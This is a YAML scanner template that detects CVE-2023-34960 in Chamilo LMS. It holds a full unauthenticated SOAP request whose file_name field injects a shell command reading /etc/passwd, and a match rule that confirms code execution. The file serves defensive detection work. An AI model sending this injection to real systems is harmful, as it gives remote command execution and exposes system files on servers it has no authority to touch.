tests/cve/CVE-2023-34960.yaml

uid: 65059daa-bd01-48e5-b013-f9af111d6b15
name: "Chamilo LMS wsConvertPpt SOAP Command Injection (CVE-2023-34960)"
description: |
  Tests Chamilo LMS for unauthenticated command injection in the wsConvertPpt SOAP
  operation. The file_name parameter is passed unsanitised to a shell command.
  Injecting shell metacharacters causes arbitrary OS command execution as www-data.
  Affected versions: 1.11.x through 1.11.18.
type: cve
cve: CVE-2023-34960
cvss: 9.8
severity: critical
confidence_base: 0.20
tags: [chamilo, lms, soap, rce, command-injection]
services: [http, https]
author: noctis
version: "1.0.0"
references:
  - "https://nvd.nist.gov/vuln/detail/CVE-2023-34960"
  - "https://support.chamilo.org/projects/1/wiki/Security_issues#Issue-112-2023-04-20-Critical-impact-High-risk-Remote-Code-Execution"
  - "https://github.com/Aituglo/CVE-2023-34960"
  - "https://github.com/projectdiscovery/nuclei-templates/blob/main/http/cves/2023/CVE-2023-34960.yaml"

steps:
  # POST SOAP request with command injection in file_name parameter.
  # The wsConvertPpt handler passes file_name to a shell command without sanitisation.
  # Injection: `{}`.pptx'|" |cat /etc/passwd||a #
  # A vulnerable server executes the injected command and returns stdout in the response.
  - id: soap-probe
    action: http_request
    method: POST
    path: "/main/webservices/additional_webservices.php"
    port: "{{port}}"
    tls_insecure: true
    follow_redirects: false
    timeout_secs: 15
    headers:
      Content-Type: "text/xml; charset=utf-8"
      SOAPAction: '""'
    body: |
      <?xml version="1.0" encoding="UTF-8"?>
      <SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" xmlns:ns1="{{scheme}}://{{target_host}}:{{port}}" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:ns2="http://xml.apache.org/xml-soap" xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/" SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
        <SOAP-ENV:Body>
          <ns1:wsConvertPpt>
            <param0 xsi:type="ns2:Map">
              <item><key xsi:type="xsd:string">file_data</key><value xsi:type="xsd:string"></value></item>
              <item><key xsi:type="xsd:string">file_name</key><value xsi:type="xsd:string">`{}`.pptx'|" |cat /etc/passwd||a #</value></item>
              <item><key xsi:type="xsd:string">service_ppt2lp_size</key><value xsi:type="xsd:string">720x540</value></item>
            </param0>
          </ns1:wsConvertPpt>
        </SOAP-ENV:Body>
      </SOAP-ENV:Envelope>
    store_as: soap_resp

  - id: rce-match
    action: match
    source: soap_resp.body
    pattern: "root:.*:0:0:"
    condition: "soap_resp.status == 200"
    on_match:
      finding:
        confidence_delta: 0.75
        qod: 75
        evidence: "RCE confirmed — /etc/passwd returned via SOAP wsConvertPpt command injection: {{soap_resp.body}}"
      stop: true
